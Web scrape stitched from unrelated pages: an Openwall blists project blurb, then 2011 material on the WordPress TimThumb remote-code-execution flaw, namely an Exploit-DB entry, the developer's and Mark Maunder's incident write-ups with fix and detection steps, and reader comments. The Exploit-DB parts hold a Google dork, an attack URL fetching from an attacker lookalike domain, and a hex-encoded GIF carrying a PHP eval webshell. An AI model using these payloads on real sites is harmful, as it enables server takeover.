# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

Yes I remember this one (I actually had a friend's WordPress get nailed
via this).

Fix: <http://code.google.com/p/timthumb/>

# Exploit Title: WordPress TimThumb Plugin - Remote Code Execution
# Google Dork: inurl:timthumb ext:php -site:googlecode.com -site:google.com
# Date: 3rd August 2011
# Author: MaXe
# Software Link: http://timthumb.googlecode.com/svn-history/r141/trunk/timthumb.php
# Version: 1.32
# Screenshot: See attachment
# Tested on: Windows XP + Apache + PHP (XAMPP)

WordPress TimThumb (Theme) Plugin - Remote Code Execution

Versions Affected:
1.* - 1.32 (Only version 1.19 and 1.32 were tested.)
(Version 1.33 did not save the cache file as .php)

Info: (See references for original advisory)
TimThumb is an image resizing utility, widely used in many WordPress themes.

External Links:
http://www.binarymoon.co.uk/projects/timthumb/
http://code.google.com/p/timthumb/

Credits:
- Mark Maunder (Original Researcher)
- MaXe (Indepedendent Proof of Concept Writer)

-:: The Advisory ::-
TimThumb is prone to a Remote Code Execution vulnerability, due to the
script does not check remotely cached files properly. By crafting a
special image file with a valid MIME-type, and appending a PHP file at
the end of this, it is possible to fool TimThumb into believing that it
is a legitimate image, thus caching it locally in the cache directory.

Attack URL: (Note! Some websites uses Base64 Encoding of the src GET-request.)
http://www.target.tld/wp-content/themes/THEME/timthumb.php?src=http://blogger.com.evildomain.tld/pocfile.php

Stored file on the Target: (This can change from host to host.)
1.19: http://www.target.tld/wp-content/themes/THEME/cache/md5($src);
1.32: http://www.target.tld/wp-content/themes/THEME/cache/external_md5($src);
md5($src); means the input value of the 'src' GET-request - Hashed in MD5 format.

Proof of Concept File:
\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00
\xFF\xFF\xFF\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00
\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02
\x44\x01\x00\x3B\x00\x3C\x3F\x70\x68\x70\x20\x40\x65

\x64\x27\x5D\x29\x3B\x20\x3F\x3E\x00

(Transparent GIF + <?php @eval($_GET['cmd']) ?>

-:: Solution ::-
Update to the latest version 1.34 or delete the timthumb file.

NOTE: This file is often renamed and you should therefore issue
a command like this in a terminal: (Thanks to rAWjAW for this info.)
find . | grep php | xargs grep -s timthumb

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# TimThumb 2.0

12 Aug 2011

TimThumb is no longer supported or maintained.
[More information →](/2014/09/timthumb-end-life/)

Ok – so – [TimThumb](/category/web-design/). I am sure many people have seen this already but some code exploits were recently discovered in TimThumb. Now that everything is under control once more I thought I would explain what happened and what is going to happen in the future.

The exploit that was found was a bug with the external image resize functionality and the fact it could be used to download and execute files. There was code in place that restricted the downloads to a whitelist of clean sites, but it wasn’t strict enough and so a hole was found that could inject php onto your server.

I found the bug myself on Friday the 29th, when my own site was exploited, so I promptly started work closing up the hole. On the following Monday the exploit was [announced by Mark Maunder](http://markmaunder.com/2011/zero-day-vulnerability-in-many-wordpress-themes/) and I got more help with hardening up the security in the script. On Thursday Mark, the person who had announced the exploit, released a total rewrite of the script – and on Friday 5th of August we joined forces to release TimThumb v2.0 – a total rewrite.

## TimThumb 2.0

TimThumb 2.0 is a total, ground up, rewrite – written with security in mind from the start. There have been a whole heap of improvements to security making this the strongest TimThumb release ever. In addition the code has been remade in an object oriented fashion, and there have been some new features added that will hopefully make the script even more popular than before.

If you hadn’t guessed already this update is a required one. If you haven’t updated already then [download the TimThumb code from Google Code](https://code.google.com/p/timthumb/) and update your sites now.

## The Future

Mark has said he will continue coding TimThumb, and we are now in talks with the WordPress team about integrating similar things into the WordPress core. We’re not sure how the functionality will work, whether a plugin, core plugin, or just including TimThumb itself – however it looks likely that the code will be brand new, utilizing WordPress core features.

****[Big News [April 24th, 2012]: I’ve launched Wordfence to permanently fix your WordPress site’s security issues. Read this now.](https://markmaunder.com/2012/04/23/introducing-wordfence-the-ultimate-wordpress-security-plugin/)****

Update: WordThumb has now been merged into [TimThumb and has become TimThumb 2.0](https://markmaunder.com/2011/wordthumb-is-now-timthumb-2-0/). Please head over to the [TimThumb site](http://timthumb.googlecode.com/) now for updates and to get the code.

Update 4: I’ve also added the [ability to screenshot websites](https://markmaunder.com/2011/wordthumb-can-now-take-screenshots-of-websites-for-you/) to [WordThumb](http://code.google.com/p/wordthumb/).

Update 3: I have forked timthumb.php into a new secure thumbnailer project called [WordThumb](http://code.google.com/p/wordthumb/). It’s a complete rewrite of timthumb and is fully backwards compatible. The only code that is recognizable is the image processing code. All file handling has been rewritten from scratch and I’ve fixed quite a few bugs. The project is now live on Google Code and [version 1.0 of WordThumb is up for download](http://code.google.com/p/wordthumb/). You can read [more details about the changes in this blog entry about WordThumb](https://markmaunder.com/2011/a-secure-rewrite-of-timthumb-php-as-wordthumb/).

Update 2: After evaluating timthumb.php I’ve decided the best solution to the security problem is to fork the project and do a line-by-line rewrite. I started work on this a day ago and it will be published [on this blog](https://markmaunder.com/) later today. (This was posted on Wednesday at 11am Pacific Time). Please check [my blog’s home page](https://markmaunder.com/) this evening (in about 8 hours) and it should be done.

Update: Ben, the developer of timthumb has been in contact and is working on a fix. His own site was hacked Friday using the same method. I’ve [submitted a tiny patch](http://code.google.com/p/timthumb/issues/list) and if you’re a solid PHP hacker it’d be great if you could [eyeball the code](http://code.google.com/p/timthumb/source/browse/trunk) with us and submit a patch (really easy to do on Google code) if you spot any other opportunities for cleanup (there are many). Given enough eyeballs… you know the quote.

The **Exec summary**: An image resizing utility called [timthumb.php](http://code.google.com/p/timthumb/) is widely used by many WordPress themes. Google shows over 39 million results for the script name. If your WordPress theme is bundled with an unmodified timthumb.php as many commercial and free themes are, then you should immediately either remove it or edit it and set the $allowedSites array to be empty. The utility only does a partial match on hostnames allowing hackers to upload and execute arbitrary PHP code in your timthumb cache directory. I haven’t audited the rest of the code, so this may or may not fix all vulnerabilities. Also recursively grep your WordPress directory and subdirs for the base64\_decode function and look out for long encoded strings to check if you’ve been compromised.

**How to fix:**

Update: As per several requests I’m posting hopefully easy to use instructions on how to fix this. This is for the latest version of timthumb.php version 1.33 [available here](http://code.google.com/p/timthumb/source/browse/trunk/timthumb.php). Check your version because there are many much older versions floating around.

**NOTE:**timthumb.php is inherently insecure because it relies on being able to write files into a directory that is accessible by people visiting your website. That’s never a good idea. So if you want to be truly secure, just delete the file using “rm timthumb.php” and make sure it didn’t break anything in the theme you’re using.  If you still want to use it but want to be a bit more secure, you can follow the instructions below.

This will disable timthumb.php’s ability to load images from external sites, but most bloggers only use timthumb.php for resizing local images:

1. SSH into your web server. You can use “putty” if you use windows and you’ll need to know your username and password.
2. cd into your wordpress installation directory. That is going to vary according to which host you’re using or how you’ve installed it.
3. You need to find every copy of timthumb.php on your system. Use the following command without double quotes: ” find . -name ‘timthumb.php’ “
4. It will show you a list of where timthumb.php is located. You may want to repeat this command using “thumb.php” as some users have reported that’s what it’s called on their systems.
5. Edit timthumb.php using a text editor like pico, nano or (if you know what you’re doing) vim. You would type (without double quotes) ” nano directory/that/tim/thumb/is/in/timthumb.php ” for example.
6. Go down to line 27 where it starts $allowedSites = array (
7. Change it to remove all the sites listed like “blogger.com” and “flickr.com”. Once you’re done the line should look like this from $allowedSites to the semi-colon:
8. $allowedSites = array();
9. Note the empty parentheses.
10. The next line should be blank and the following line will probably say “STOP MODIFYING HERE”
11. That’s it. Save the file and you’re done.

**Full post:**

Earlier today this blog was hacked. I found out because I loaded a page on my blog and my blog spoke to me. It said “Congratulations, you’re a winner”.

After a brief WTF? I loaded up the dev tools in Chrome and checked what network requests were going out. Ad content was loading and I don’t run ads on my blog. For some reason the content was hidden, perhaps someone gets paid per impression.

I found the hostname the ads were loading from and grepped the WordPress code for the hostname and nothing turned up. Next I dumped the database  – in fact all mysql databases on the server and grepped for the ad hostname and still nothing.

Eventually I found it. The hacker had done an eval(base64\_decode(‘…long base64 encoded string’)) in one of WordPress PHP files. My bad for allowing that file to be writeable by the web server. Read on, because even if you set your file permissions correctly on the WordPress php files, you may still be vulnerable.

But what I really wanted to know was how the hell he wrote to a file on my machine.

I checked my nginx and apache access and error logs and eventually found a few PHP errors in the apache log that clued me in.

Turns out the theme I’m using, Memoir, which I bought for $30 from ElegantThemes.com uses a library called timthumb.php. timthumb.php uses a cache directory which lives under wp-content and it writes to that directory when it fetches an image and resizes it.

If you can figure out a way to get timthumb to fetch a php file and put it in that directory, you’re in.

The default configuration of timthumb.php which many themes use allow files to be remotely loaded and resized from the following domains:

```
$allowedSites = array (
	'flickr.com',
	'picasa.com',
	'blogger.com',
	'wordpress.com',
	'img.youtube.com',
	'upload.wikimedia.org',
	'photobucket.com',
);
```

The problem is the way the developer checks which domain he’s fetching from. He uses the PHP strpos function and if the domain string appears anywhere in the hostname, he’ll allow that file to be fetched.

So if you create a file on a web server like so: http://blogger.com.somebadhackersite.com/badscript.php and tell timthumb.php to fetch it, it merrily fetches the file and puts it in the cache directory ready for execution.

[Note: I’m 99% sure this will work on most webserver configurations because the cache directory that timthumb uses is a subdirectory of directories that are allowed to execute files with a .php extension. So unless you explicitly tell your server to not execute .php files in the cache directory, it’ll execute them. ]

Then you just access the file in the cache directory on the target site using your web browser and whatever code came from http://blogger.com.somebadhackersite.com/badscript.php will get executed by the web server.

In my case, this is what the hacker saw when he accessed my site:

[![](https://markmaunder.com/wp-content/uploads/2011/08/alucar_shell-189x300.png "alucar_shell")](https://markmaunder.com/wp-content/uploads/2011/08/alucar_shell.png)

It’s called Alucar shell and it’s a php file that contains one massive base64 encoded string that gets decoded and evalled. It’s encoded in an attempt to hide itself.

When you first hit the script it presents you with a login page and once you’re signed in you see the screenshot above. It works quite well actually. Even if the rest of your filesystem is secure, whoever is using it can dump read-only files like /etc/passwd to get a list of user accounts, config files which may contain passwords, etc..etc..

The [current version of timthumb](http://code.google.com/p/timthumb/) has this issue. Since it’s already in the wild and I just got hacked by it, I figure it’s ok to release the vulnerability to the general public.

To check if you have been hacked do the following:

1. Sign into your server using ssh
2. cd to your wordpress installation directory
3. run “grep -r base64\_decode \*”
4. You should see a few occurences but if any of them have a long encoded string between the parentheses, then you’re probably hacked.

The hacker used base64\_decode in the file uploaded to the timthumb.php cache directory as well as where he injected code in my blog.
Also check your /tmp/ directory and if you have any suspicious files there like xwf.txt or any other .txt files, look at them in a text editor.
How to (possibly) fix this:

1. Go into your theme directory and figure out where timthumb.php is.
2. You might try “find /your/wordpress/dir/wp-content/themes/YourTheme/ -name “timthumb.php””
3. Edit timthumb and remove the list of external websites that content is allowed to be loaded from.
4. I have not audited the rest of the code, so this may or may not make it secure.
5. The developer really needs to use a regular expression to check the external hostnames images can be loaded from.

I would also recommend that if you’re a theme developer using timthumb.php, you check to see how it’s configured and try to load a php file from blogger.com.yoursite.com to see if you’re vulnerable.

   Do you know if timthumb allowed the upload of a file with the extension .php? Or did it allow the upload of a file with a double extension like badscript.php.jpg?

****[Big News [April 24th, 2012]: I’ve launched Wordfence to permanently fix your WordPress site’s security issues. Read this now.](https://markmaunder.com/2012/04/23/introducing-wordfence-the-ultimate-wordpress-security-plugin/)****

UPDATE: WordThumb has now been merged into [TimThumb and has become TimThumb 2.0](https://markmaunder.com/2011/wordthumb-is-now-timthumb-2-0/). Please head over to the [TimThumb site](http://timthumb.googlecode.com/) now for updates and to get the code.

As [I mentioned yesterday my WordPress blog was hacked](https://markmaunder.com/2011/zero-day-vulnerability-in-many-wordpress-themes/). The security hole has been picked up by [hacker news](http://news.ycombinator.com/item?id=2835288) and from there, [The Register](http://www.theregister.co.uk/2011/08/02/wordpress_zero_day/), [ZDNet](http://www.zdnet.com/blog/security/hackers-attack-zero-day-flaw-in-wordpress-themes/9181), [PCWorld](http://www.pcworld.com/businesscenter/article/237079/zeroday_vulnerability_found_in_a_wordpress_image_utility.html), and [Geek.com](http://www.geek.com/articles/news/free-image-utility-renders-many-wordpress-websites-easy-hacking-targets-2011082/) among others. The publicity will hopefully get Theme developers to update timthumb.php or switch to a different thumbnail generator.

I’ve been contacted with requests for detailed info, so I’m going to post the technical details of how my site was hacked along with the scripts that the hacker used to get in. This is targeted at a technical audience.

The server that served you this web page is the one that was hacked. It runs Ubuntu 10.10 with all security updates installed. It is a virtual server hosted by Linode.

I also run the latest version of WordPress.org.

My WordPress root directory was writable, but making it read only would not have prevented the hack.

Timthumb.php in it’s default configuration allows site visitors to load images from a predefined set of remote websites for resizing and serving. Timthumb offers a caching mechanism so that it doesn’t have to continually re-process images. The cache directory lives under the wordpress root and is accessible by visitors to the website.

The ability for a site visitor to load content from a remote website and to make the web server write that remote content to a web accessible directory is the cause of the vulnerability in timthumb.php.

To be clear, timthumb.php does not actually execute any remote malicious code that causes this vulnerability. This was a point of confusion among some commenters in my blog post yesterday. It simply gets a remote file and places it in a web accessible directory.

Timthumb only allows remote content from a small range of websites to be loaded remotely. In it’s default configuration these included Blogger, WordPress.com and other sites that are writeable by the general public.

Timthumb’s verification that remote content was only being loaded by these domains was also broken. You could for example load content from hackersiteblogspot.com or from blogspot.com.hackersite.com.

I’ve [submitted a patch](http://code.google.com/p/timthumb/issues/list) that fixes the pattern matching and removed all default public hosting sites from the allowed sites list. The developer has opted to keep a small list in which I’m not in favor of.

In my case the hacker uploaded a script to my cache directory which timthumb.php stores as “external\_<md5 hash>.php”. He/she then accessed this script directly in my timthumb cache directory as something like https://markmaunder.com/wp-content/themes/Memoir/scripts/cache/external\_md5hash.php

The script uploaded was Alucar shell which is base64 encoded and decodes when it executes. That makes it a little harder to find it using grep or similar tool. You can see the [encoded version of Alucar](/alucarScript.txt) here and the [decoded version of Alucar here](/alucarDecoded.txt) (without the username and password preamble at the top).

Here’s a screenshot of the UI:

[![Alucar UI](/wp-content/uploads/2011/08/alucar_shell.png "Alucar UI")](/wp-content/uploads/2011/08/alucar_shell.png)

This script which gives a web based shell access was then used to inject base64 code to one of my core wordpress files wp-blog-header.php which lives in the wordpress root directory. The file with injected code [looked like this](/wp-blog-header-hacked.txt).

The [decoded version of this base64 code is this](/decodedWordpressInjection.txt). The code executes whenever a blog page is visited. It fetches a file from a URL and writes it to /tmp. Then it executes the php code that is contained in this file. In my case it simply echo’d some javascript code that would show ads. Here is [the code contained in the file in /tmp](/xwf.txt).

Again, this file is periodically updated with new PHP code, so the attacker could have his way with my server until I found out about it. The code could be altered to instead become a spam system and work it’s way through a long list of spam emails.

The way I tracked this to conclusion was:

* Heard audio on my blog telling me I’d won something.
* Checked Chrome network tools and saw ad content loading and I don’t serve ads.
* Grepped wordpress source and themes for hostname I saw in ad. Nothing.
* Dumped mysql databases on server (all of them) and grepped for hostname. Nothing.
* Confusion reigns.
* Started working my way through nginx (which is my front end proxy to apache) and apache access and error logs.
* Spotted lines in apache error log like this: “[Mon Aug 01 11:09:12 2011] [error] [client 127.0.0.1] PHP Warning: file\_get\_contents(http://blogger.com.zoha.vn/db/load.php): failed to open stream: HTTP request failed! in /usr/local/markmaunder/wp-content/themes/Memoir/timthumb.php on line 675”
* Checked timthumb’s cache directory and found Alucar.
* Realized base64 encoding is why I didn’t find anything with grep.
* Regrepped wordpress source and database and found injection in wp-blog-header.php
* Decoded base64 stuff and played with Alucar
* Found tmp file in /tmp
* Cleaned everything and fixed permissions. Ran chkrootkit and other utils on machine to see if anything else was compromised. Changed passwords, etc.

   Hi mark,

   Great work, i added tim-thumb to my themes and checked it with themechecker [ <http://wordpress.org/extend/plugins/theme-check/> ] , it shows a lot of warning, especialy the base 64 encoding, My testers are very much sharp in pointing it out, how should i remove those warnings or is it ok to go ahead.

   Hi Mark, thx for the writeup! Quick question:

   If I hosted my wordpress site (with the pre 2.0 timthumb script) in the public/wordpress/ directory (i.e. not the home directory) on a shared hosting server, do you know whether it’s possible that the hacker affected directories (such as injecting code into existing files or creating a new file) outside of the /wordpress/ directory? I.e. in the /public/ directory?

   Interesting that a few people have posted in the past few days. I had 2 sites hacked and reported to me by Google. However, In reading your information, it looks like it was hacked a while back. I thought I had cleaned it up, but it was the early stages of this hack’s appearance and not a lot of information was available.

   I’m wondering if some hackers have recently unleashed some script intrusions that run malware and Google is notifying people of it?

   Also, is it possible that the changed code will allow a hacker access to the hosting directory? I am considering wiping the entire directory and reinstalling to make sure it’s clean. I guess my question is: have there been any reports of further intrusions after we go through the clean up process you described?

   Thanks!

      I recently had 3 of my sites hacked. 2 of them WordPress and one Joomla. Same hack (Base64). I was able to clean the Joomla site, but both WordPress sites are jacked (for a lack of better terms). The IP addresses that were logged into my account actually belong to my web host, so I know that it wasn’t something that I uploaded. Since I pointed out that the IP address that they provided was theirs, they have not responded to any of my emails/tickets. Frustrated to say the least. (DREAMHOST)

         If the moderator let it through, see my post above. Or just click <http://forum.joomla.org/viewtopic.php?p=1889022#p1889022> for some insight.

   I’m following this tutorial for a test, locally, with XAMPP.

   I can upload the image (test.php) but instead of creating the .php file in the “cache” of timthumb, is created only one image .PNG

   How can it be that is created only a PNG (from gif + php code)? The exploit does not work that way because, obviously, you can not execute commands.

# Exploit Title: Multiple Wordpress timthumb.php reuse vulnerabilities
# Date: 09/19/2011
# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)

---
Description
---
The following Wordpress plugins reuse a vulnerable version of the timthumb.php library.

By hosting a malicious GIF file with PHP code appended to the end on an attacker controlled
domain such as blogger.com.evil.com and then providing it to the script through the
src GET parameter, it is possible to upload a shell and execute arbitrary code on the webserver.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
